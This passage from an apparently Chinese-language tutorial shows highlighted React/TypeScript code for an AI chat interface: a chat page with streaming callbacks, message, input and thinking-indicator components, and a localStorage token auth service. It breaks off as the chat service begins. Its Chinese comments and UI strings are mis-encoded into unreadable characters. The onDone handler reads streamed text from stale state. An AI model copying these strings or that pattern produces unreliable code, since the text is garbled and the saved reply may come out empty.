    <span class="hljs-comment">// æ·»åŠ ç”¨æˆ·æ¶ˆæ¯</span>
    <span class="hljs-keyword">const</span> <span class="hljs-attr">newUserMessage</span>: <span class="hljs-title class_">Message</span> = {
      <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>(),
      <span class="hljs-attr">role</span>: <span class="hljs-string">'user'</span>,
      <span class="hljs-attr">content</span>: userMessage,
      <span class="hljs-attr">created_at</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>(),
    }
    <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> [...prev, newUserMessage])
    
    <span class="hljs-comment">// å¼€å§‹æ€è€ƒ</span>
    <span class="hljs-title function_">setIsThinking</span>(<span class="hljs-literal">true</span>)
    <span class="hljs-title function_">setCurrentAssistantMessage</span>(<span class="hljs-string">''</span>)
    
    <span class="hljs-keyword">try</span> {
      <span class="hljs-keyword">await</span> <span class="hljs-title function_">sendMessageStream</span>(
        currentConversation.<span class="hljs-property">id</span>,
        userMessage,
        {
          <span class="hljs-attr">onThinking</span>: <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ€è€ƒä¸­:'</span>, data)
          },
          
          <span class="hljs-attr">onSources</span>: <span class="hljs-function">(<span class="hljs-params">data</span>) =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'æ£€ç´¢åˆ°'</span>, data.<span class="hljs-property">count</span>, <span class="hljs-string">'æ¡ç›¸å…³æ–‡æ¡£'</span>)
            <span class="hljs-title function_">setIsThinking</span>(<span class="hljs-literal">false</span>)
          },
          
          <span class="hljs-attr">onToken</span>: <span class="hljs-function">(<span class="hljs-params">token</span>) =&gt;</span> {
            <span class="hljs-title function_">setCurrentAssistantMessage</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> prev + token)
          },
          
          <span class="hljs-attr">onDone</span>: <span class="hljs-function">() =&gt;</span> {
            <span class="hljs-comment">// ä¿å­˜åŠ©æ‰‹æ¶ˆæ¯</span>
            <span class="hljs-keyword">const</span> <span class="hljs-attr">assistantMessage</span>: <span class="hljs-title class_">Message</span> = {
              <span class="hljs-attr">id</span>: <span class="hljs-title class_">Date</span>.<span class="hljs-title function_">now</span>().<span class="hljs-title function_">toString</span>(),
              <span class="hljs-attr">role</span>: <span class="hljs-string">'assistant'</span>,
              <span class="hljs-attr">content</span>: currentAssistantMessage,
              <span class="hljs-attr">created_at</span>: <span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>().<span class="hljs-title function_">toISOString</span>(),
            }
            <span class="hljs-title function_">setMessages</span>(<span class="hljs-function"><span class="hljs-params">prev</span> =&gt;</span> [...prev, assistantMessage])
            <span class="hljs-title function_">setCurrentAssistantMessage</span>(<span class="hljs-string">''</span>)
          },
          
          <span class="hljs-attr">onError</span>: <span class="hljs-function">(<span class="hljs-params">error</span>) =&gt;</span> {
            <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'å‘é€å¤±è´¥:'</span>, error)
            <span class="hljs-title function_">setIsThinking</span>(<span class="hljs-literal">false</span>)
          }
        }
      )
    } <span class="hljs-keyword">catch</span> (error) {
      <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">error</span>(<span class="hljs-string">'å‘é€æ¶ˆæ¯å¤±è´¥:'</span>, error)
      <span class="hljs-title function_">setIsThinking</span>(<span class="hljs-literal">false</span>)
    }
  }

  <span class="hljs-comment">// é”®ç›˜äº‹ä»¶</span>
  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleKeyPress</span> = (<span class="hljs-params">e: React.KeyboardEvent</span>) =&gt; {
    <span class="hljs-keyword">if</span> (e.<span class="hljs-property">key</span> === <span class="hljs-string">'Enter'</span> &amp;&amp; !e.<span class="hljs-property">shiftKey</span>) {
      e.<span class="hljs-title function_">preventDefault</span>()
      <span class="hljs-title function_">handleSendMessage</span>()
    }
  }

  <span class="hljs-keyword">if</span> (loading) {
    <span class="hljs-keyword">return</span> (
      <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex h-screen items-center justify-center"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-gray-500"</span>&gt;</span>åŠ è½½ä¸­...<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
    )
  }

  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex h-screen bg-gray-50"</span>&gt;</span>
      {/* ä¾§è¾¹æ  */}
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-64 bg-white border-r border-gray-200 flex flex-col"</span>&gt;</span>
        {/* å¤´éƒ¨ */}
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"p-4 border-b border-gray-200"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
            <span class="hljs-attr">onClick</span>=<span class="hljs-string">{handleNewChat}</span>
            <span class="hljs-attr">className</span>=<span class="hljs-string">"w-full flex items-center justify-center space-x-2 px-4 py-2.5 bg-blue-600 text-white rounded-lg hover:bg-blue-700 transition-colors"</span>
          &gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span>&gt;</span>æ–°å»ºå¯¹è¯<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        {/* å¯¹è¯åˆ—è¡¨ */}
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex-1 overflow-y-auto p-2"</span>&gt;</span>
          {conversations.map((conv) =&gt; (
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
              <span class="hljs-attr">key</span>=<span class="hljs-string">{conv.id}</span>
              <span class="hljs-attr">onClick</span>=<span class="hljs-string">{()</span> =&gt;</span> handleSelectConversation(conv)}
              className={`px-3 py-2.5 mb-1 rounded-lg cursor-pointer transition-colors ${
                currentConversation?.id === conv.id
                  ? 'bg-blue-50 text-blue-700'
                  : 'hover:bg-gray-100 text-gray-700'
              }`}
            &gt;
              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-sm truncate"</span>&gt;</span>{conv.title}<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          ))}
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        {/* ç”¨æˆ·ä¿¡æ¯ */}
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"p-4 border-t border-gray-200"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex items-center space-x-2"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-8 h-8 bg-gray-200 rounded-full flex items-center justify-center"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-sm text-gray-600"</span>&gt;</span>
                {user?.username?.[0]?.toUpperCase()}
              <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-sm text-gray-700 truncate"</span>&gt;</span>
              {user?.username}
            <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

      {/* ä¸»èŠå¤©åŒºåŸŸ */}
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex-1 flex flex-col"</span>&gt;</span>
        {/* å¤´éƒ¨ */}
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"h-14 bg-white border-b border-gray-200 flex items-center px-4"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-lg font-semibold text-gray-800"</span>&gt;</span>
            {currentConversation?.title || 'é€‰æ‹©æˆ–åˆ›å»ºå¯¹è¯'}
          <span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        {/* æ¶ˆæ¯åŒºåŸŸ */}
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex-1 overflow-y-auto"</span>&gt;</span>
          {!currentConversation ? (
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"h-full flex flex-col items-center justify-center text-center px-4"</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-16 h-16 bg-blue-100 rounded-2xl flex items-center justify-center mb-4"</span>&gt;</span>
                <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-3xl"</span>&gt;</span>ğŸ¤–<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
              <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">h2</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-2xl font-semibold text-gray-800 mb-2"</span>&gt;</span>
                ä»Šå¤©æœ‰ä»€ä¹ˆå¯ä»¥å¸®åˆ°ä½ ï¼Ÿ
              <span class="hljs-tag">&lt;/<span class="hljs-name">h2</span>&gt;</span>
              <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-gray-600 mb-6"</span>&gt;</span>
                ç‚¹å‡»"æ–°å»ºå¯¹è¯"å¼€å§‹ä¸ AI åŠ©æ‰‹äº¤æµ
              <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          ) : (
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"max-w-3xl mx-auto px-4 py-6"</span>&gt;</span>
              {messages.map((msg) =&gt; (
                <span class="hljs-tag">&lt;<span class="hljs-name">ChatMessage</span> <span class="hljs-attr">key</span>=<span class="hljs-string">{msg.id}</span> <span class="hljs-attr">message</span>=<span class="hljs-string">{msg}</span> /&gt;</span>
              ))}
              
              {/* å®æ—¶æ˜¾ç¤ºåŠ©æ‰‹å›å¤ */}
              {currentAssistantMessage &amp;&amp; (
                <span class="hljs-tag">&lt;<span class="hljs-name">ChatMessage</span>
                  <span class="hljs-attr">message</span>=<span class="hljs-string">{{</span>
                    <span class="hljs-attr">id:</span> '<span class="hljs-attr">streaming</span>',
                    <span class="hljs-attr">role:</span> '<span class="hljs-attr">assistant</span>',
                    <span class="hljs-attr">content:</span> <span class="hljs-attr">currentAssistantMessage</span>,
                    <span class="hljs-attr">created_at:</span> <span class="hljs-attr">new</span> <span class="hljs-attr">Date</span>()<span class="hljs-attr">.toISOString</span>(),
                  }}
                  <span class="hljs-attr">isStreaming</span>=<span class="hljs-string">{true}</span>
                /&gt;</span>
              )}
              
              {/* æ€è€ƒæŒ‡ç¤ºå™¨ */}
              {isThinking &amp;&amp; <span class="hljs-tag">&lt;<span class="hljs-name">ThinkingIndicator</span> /&gt;</span>}
              
              <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">ref</span>=<span class="hljs-string">{messagesEndRef}</span> /&gt;</span>
            <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
          )}
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        {/* è¾“å…¥åŒºåŸŸ */}
        {currentConversation &amp;&amp; (
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"bg-white border-t border-gray-200 p-4"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">ChatInput</span>
              <span class="hljs-attr">value</span>=<span class="hljs-string">{inputValue}</span>
              <span class="hljs-attr">onChange</span>=<span class="hljs-string">{setInputValue}</span>
              <span class="hljs-attr">onSend</span>=<span class="hljs-string">{handleSendMessage}</span>
              <span class="hljs-attr">onKeyPress</span>=<span class="hljs-string">{handleKeyPress}</span>
              <span class="hljs-attr">disabled</span>=<span class="hljs-string">{isThinking}</span>
            /&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        )}
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-11">3.3 æ¶ˆæ¯ç»„ä»¶</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// components/ChatMessage.tsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">Message</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/services/chat'</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ChatMessageProps</span> {
  <span class="hljs-attr">message</span>: <span class="hljs-title class_">Message</span>
  isStreaming?: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatMessage</span>(<span class="hljs-params">{ message, isStreaming }: ChatMessageProps</span>) {
  <span class="hljs-keyword">const</span> isUser = message.<span class="hljs-property">role</span> === <span class="hljs-string">'user'</span>
  
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">mb-6</span> <span class="hljs-attr">flex</span> ${<span class="hljs-attr">isUser</span> ? '<span class="hljs-attr">justify-end</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">justify-start</span>'}`}&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
        <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">flex</span> <span class="hljs-attr">space-x-3</span> <span class="hljs-attr">max-w-</span>[<span class="hljs-attr">80</span>%] ${
          <span class="hljs-attr">isUser</span> ? '<span class="hljs-attr">flex-row-reverse</span> <span class="hljs-attr">space-x-reverse</span>' <span class="hljs-attr">:</span> ''
        }`}
      &gt;</span>
        {/* å¤´åƒ */}
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">w-8</span> <span class="hljs-attr">h-8</span> <span class="hljs-attr">rounded-full</span> <span class="hljs-attr">flex</span> <span class="hljs-attr">items-center</span> <span class="hljs-attr">justify-center</span> <span class="hljs-attr">flex-shrink-0</span> ${
            <span class="hljs-attr">isUser</span> ? '<span class="hljs-attr">bg-blue-600</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">bg-gray-200</span>'
          }`}
        &gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">text-sm</span> ${<span class="hljs-attr">isUser</span> ? '<span class="hljs-attr">text-white</span>' <span class="hljs-attr">:</span> '<span class="hljs-attr">text-gray-600</span>'}`}&gt;</span>
            {isUser ? 'ğŸ‘¤' : 'ğŸ¤–'}
          <span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>

        {/* æ¶ˆæ¯å†…å®¹ */}
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span>
          <span class="hljs-attr">className</span>=<span class="hljs-string">{</span>`<span class="hljs-attr">px-4</span> <span class="hljs-attr">py-3</span> <span class="hljs-attr">rounded-2xl</span> ${
            <span class="hljs-attr">isUser</span>
              ? '<span class="hljs-attr">bg-blue-600</span> <span class="hljs-attr">text-white</span>'
              <span class="hljs-attr">:</span> '<span class="hljs-attr">bg-white</span> <span class="hljs-attr">border</span> <span class="hljs-attr">border-gray-200</span> <span class="hljs-attr">text-gray-800</span>'
          }`}
        &gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-sm whitespace-pre-wrap break-words"</span>&gt;</span>
            {message.content}
            {isStreaming &amp;&amp; (
              <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"inline-block w-1 h-4 ml-1 bg-current animate-pulse"</span> /&gt;</span>
            )}
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-12">3.4 è¾“å…¥ç»„ä»¶</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// components/ChatInput.tsx</span>
<span class="hljs-keyword">import</span> { <span class="hljs-title class_">SendIcon</span> } <span class="hljs-keyword">from</span> <span class="hljs-string">'@/ui/Icons'</span>

<span class="hljs-keyword">interface</span> <span class="hljs-title class_">ChatInputProps</span> {
  <span class="hljs-attr">value</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">onChange</span>: <span class="hljs-function">(<span class="hljs-params">value: <span class="hljs-built_in">string</span></span>) =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">onSend</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-built_in">void</span>
  <span class="hljs-attr">onKeyPress</span>: <span class="hljs-function">(<span class="hljs-params">e: React.KeyboardEvent</span>) =&gt;</span> <span class="hljs-built_in">void</span>
  disabled?: <span class="hljs-built_in">boolean</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ChatInput</span>(<span class="hljs-params">{
  value,
  onChange,
  onSend,
  onKeyPress,
  disabled
}: ChatInputProps</span>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"max-w-3xl mx-auto"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex items-end space-x-3 bg-gray-50 rounded-2xl p-3 border border-gray-200 focus-within:border-blue-600 transition-colors"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">textarea</span>
          <span class="hljs-attr">value</span>=<span class="hljs-string">{value}</span>
          <span class="hljs-attr">onChange</span>=<span class="hljs-string">{(e)</span> =&gt;</span> onChange(e.target.value)}
          onKeyPress={onKeyPress}
          placeholder="åœ¨è¿™é‡Œè¾“å…¥æ¶ˆæ¯..."
          className="flex-1 bg-transparent resize-none outline-none text-sm text-gray-800 placeholder-gray-500 max-h-32"
          rows={1}
          disabled={disabled}
        /&gt;
        <span class="hljs-tag">&lt;<span class="hljs-name">button</span>
          <span class="hljs-attr">onClick</span>=<span class="hljs-string">{onSend}</span>
          <span class="hljs-attr">disabled</span>=<span class="hljs-string">{!value.trim()</span> || <span class="hljs-attr">disabled</span>}
          <span class="hljs-attr">className</span>=<span class="hljs-string">"p-2.5 bg-blue-600 text-white rounded-xl hover:bg-blue-700 disabled:opacity-50 disabled:cursor-not-allowed transition-colors flex-shrink-0"</span>
        &gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">SendIcon</span> <span class="hljs-attr">size</span>=<span class="hljs-string">{18}</span> /&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">p</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-xs text-gray-500 text-center mt-2"</span>&gt;</span>
        AI å›ç­”å¯èƒ½ä¸å‡†ç¡®ï¼Œè¯·è°¨æ…ä½¿ç”¨
      <span class="hljs-tag">&lt;/<span class="hljs-name">p</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<h4 data-id="heading-13">3.5 æ€è€ƒæŒ‡ç¤ºå™¨</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// components/ThinkingIndicator.tsx</span>
<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">ThinkingIndicator</span>(<span class="hljs-params"/>) {
  <span class="hljs-keyword">return</span> (
    <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"mb-6 flex justify-start"</span>&gt;</span>
      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex space-x-3 max-w-[80%]"</span>&gt;</span>
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-8 h-8 rounded-full flex items-center justify-center flex-shrink-0 bg-gray-200"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">span</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"text-sm text-gray-600"</span>&gt;</span>ğŸ¤–<span class="hljs-tag">&lt;/<span class="hljs-name">span</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        
        <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"px-4 py-3 rounded-2xl bg-white border border-gray-200"</span>&gt;</span>
          <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"flex space-x-2"</span>&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-2 h-2 bg-gray-400 rounded-full animate-bounce"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">animationDelay:</span> '<span class="hljs-attr">0ms</span>' }} /&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-2 h-2 bg-gray-400 rounded-full animate-bounce"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">animationDelay:</span> '<span class="hljs-attr">150ms</span>' }} /&gt;</span>
            <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">"w-2 h-2 bg-gray-400 rounded-full animate-bounce"</span> <span class="hljs-attr">style</span>=<span class="hljs-string">{{</span> <span class="hljs-attr">animationDelay:</span> '<span class="hljs-attr">300ms</span>' }} /&gt;</span>
          <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
        <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span>
    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span>
  )
}
</code></pre>
<hr/>
<h3 data-id="heading-14">å››ã€APIæœåŠ¡å°è£…</h3>
<h4 data-id="heading-15">4.1 è®¤è¯æœåŠ¡</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// services/auth.ts</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>

<span class="hljs-keyword">const</span> <span class="hljs-variable constant_">API_URL</span> = process.<span class="hljs-property">env</span>.<span class="hljs-property">NEXT_PUBLIC_API_URL</span> || <span class="hljs-string">'http://localhost:8000'</span>

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-attr">id</span>: <span class="hljs-built_in">number</span>
  <span class="hljs-attr">username</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">email</span>: <span class="hljs-built_in">string</span>
  full_name?: <span class="hljs-built_in">string</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">LoginResponse</span> {
  <span class="hljs-attr">access_token</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">refresh_token</span>: <span class="hljs-built_in">string</span>
  <span class="hljs-attr">user</span>: <span class="hljs-title class_">User</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">setTokens</span>(<span class="hljs-params">access: <span class="hljs-built_in">string</span>, refresh: <span class="hljs-built_in">string</span></span>) {
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'access_token'</span>, access)
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">setItem</span>(<span class="hljs-string">'refresh_token'</span>, refresh)
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getAccessToken</span>(<span class="hljs-params"/>): <span class="hljs-built_in">string</span> | <span class="hljs-literal">null</span> {
  <span class="hljs-keyword">return</span> <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">getItem</span>(<span class="hljs-string">'access_token'</span>)
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">clearTokens</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'access_token'</span>)
  <span class="hljs-variable language_">localStorage</span>.<span class="hljs-title function_">removeItem</span>(<span class="hljs-string">'refresh_token'</span>)
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">isAuthenticated</span>(<span class="hljs-params"/>): <span class="hljs-built_in">boolean</span> {
  <span class="hljs-keyword">return</span> !!<span class="hljs-title function_">getAccessToken</span>()
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">username: <span class="hljs-built_in">string</span>, password: <span class="hljs-built_in">string</span></span>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">LoginResponse</span>&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">post</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/api/auth/login`</span>, {
    username,
    password
  })
  
  <span class="hljs-keyword">const</span> data = response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>
  <span class="hljs-title function_">setTokens</span>(data.<span class="hljs-property">access_token</span>, data.<span class="hljs-property">refresh_token</span>)
  <span class="hljs-keyword">return</span> data
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">getCurrentUser</span>(<span class="hljs-params"/>): <span class="hljs-title class_">Promise</span>&lt;<span class="hljs-title class_">User</span>&gt; {
  <span class="hljs-keyword">const</span> response = <span class="hljs-keyword">await</span> axios.<span class="hljs-title function_">get</span>(<span class="hljs-string">`<span class="hljs-subst">${API_URL}</span>/api/auth/me`</span>, {
    <span class="hljs-attr">headers</span>: {
      <span class="hljs-title class_">Authorization</span>: <span class="hljs-string">`Bearer <span class="hljs-subst">${getAccessToken()}</span>`</span>
    }
  })
  <span class="hljs-keyword">return</span> response.<span class="hljs-property">data</span>.<span class="hljs-property">data</span>
}

<span class="hljs-keyword">export</span> <span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"/>) {
  <span class="hljs-title function_">clearTokens</span>()
}
</code></pre>
<h4 data-id="heading-16">4.2 èŠå¤©æœåŠ¡</h4>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">// services/chat.ts</span>
<span class="hljs-keyword">import</span> axios <span class="hljs-keyword">from</span> <span class="hljs-string">'axios'</span>
<span class="hljs-keyword">import</span> { fetchEventSource } <span class="hljs-keyword">from</span> <span class="hljs-string">'@microsoft/fetch-event-source'</span>
<span class="hljs-keyword">import</span> { getAccessToken } <span class="hljs-keyword">from</span> <span class="hljs-string">'./auth'</span>

